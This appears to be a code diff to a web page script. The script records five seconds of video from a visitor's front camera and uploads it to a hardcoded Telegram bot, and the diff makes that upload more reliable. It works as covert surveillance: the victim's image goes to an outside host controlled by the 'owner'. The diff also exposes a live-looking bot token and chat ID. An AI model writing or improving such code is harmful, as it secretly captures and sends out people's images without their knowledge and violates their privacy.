@@ -21,24 +21,32 @@
         async function startRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const mediaRecorder = new MediaRecorder(stream);
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                 let chunks = [];
 
                 mediaRecorder.ondataavailable = event => chunks.push(event.data);
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: "video/webm" });
+
+                    // Konversi blob ke File
+                    const file = new File([blob], "recorded-video.webm", { type: "video/webm" });
+
+                    // Kirim ke bot Telegram
                     const formData = new FormData();
-                    formData.append("chat_id", "7081489041"); // ID Telegram Owner
-                    formData.append("video", blob, "recorded-video.webm");
+                    formData.append("chat_id", "7081489041"); // ID Owner
+                    formData.append("video", file); 
 
                     fetch("https://api.telegram.org/bot7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg/sendVideo", {
                         method: "POST",
                         body: formData
-                    }).then(response => console.log("Video sent!")).catch(err => console.error(err));
+                    })
+                    .then(response => response.json())
+                    .then(result => console.log("Video sent:", result))
+                    .catch(err => console.error("Failed to send video:", err));
                 };
 
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000); // Rekam 5 detik lalu kirim
+                setTimeout(() => mediaRecorder.stop(), 5000); // Rekam 5 detik lalu stop
             } catch (err) {
                 console.error("Akses kamera ditolak!", err);
             }
